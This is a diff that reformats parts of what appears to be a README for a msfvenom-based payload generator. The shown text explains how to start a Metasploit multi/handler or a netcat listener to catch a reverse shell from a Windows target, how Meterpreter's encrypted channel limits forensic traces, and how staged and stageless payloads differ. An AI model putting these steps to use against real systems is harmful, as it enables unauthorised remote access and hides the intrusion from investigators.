@@ -242,7 +242,7 @@ print(Fore.GREEN + "[*] Exporting payload, please be patient as: " + filename)
 subprocess.Popen(payload, shell=True).wait()
 print("[*] Exported payload successfully.")
 
->>> EXAMPLE ON How to set up a listener to capture the connection from the target............ in this example our target is Windows OS.
+## >>> EXAMPLE ON How to set up a listener to capture the connection from the target............ in this example our target is Windows OS.
 In KALI , Open a terminal to start a listener and wait for reverse shell connection
 in terminal type in msfconsole as a command, then  
 msf6> use multi/handler
@@ -268,14 +268,14 @@ meterpreter> screenshot ### and much more
         It has an ability to migrate to other running processes easily.
         By default, Meterpreter communicates over encrypted channel, which leaves a limited trace on the compromised system from a forensic perspective.
 
-##NOTE:also credit to: https://blog.spookysec.net/stage-v-stageless-1/
-       1.stageless payload contains everything you will need to get a reverse shell callback, That means the size of the file is much larger and the program is more complex 
-       compared to the staged. This payload can be caught by listening on a raw socket (you can create a listener in Netcat ie nc -lvp 1337).
-       2.stage payload has to beacon out to another device(the initial executable is generally called a "dropper") to receive  second "Stage" which contains a more full and complete program.
+##NOTE: also credit to: https://blog.spookysec.net/stage-v-stageless-1/
+        1.stageless payload contains everything you will need to get a reverse shell callback, That means the size of the file is much larger and the program is more complex 
+        compared to the staged. This payload can be caught by listening on a raw socket (you can create a listener in Netcat ie nc -lvp 1337).
+        2.stage payload has to beacon out to another device(the initial executable is generally called a "dropper") to receive  second "Stage" which contains a more full and complete program.
        
-##NOTE The Metasploit developers came up with a naming scheme for their payloads, 
-       all stageless payloads will be in the platform/shell_type_protocol. 
-       If you are unsure about the payload type you’re using, you can execute the msfvenom --list-payloads command to see a brief description about all of the payloads msfvenom can offer.
+##NOTE: The Metasploit developers came up with a naming scheme for their payloads, 
+        all stageless payloads will be in the platform/shell_type_protocol. 
+        If you are unsure about the payload type you’re using, you can execute the msfvenom --list-payloads command to see a brief description about all of the payloads msfvenom can offer.
 
 
 
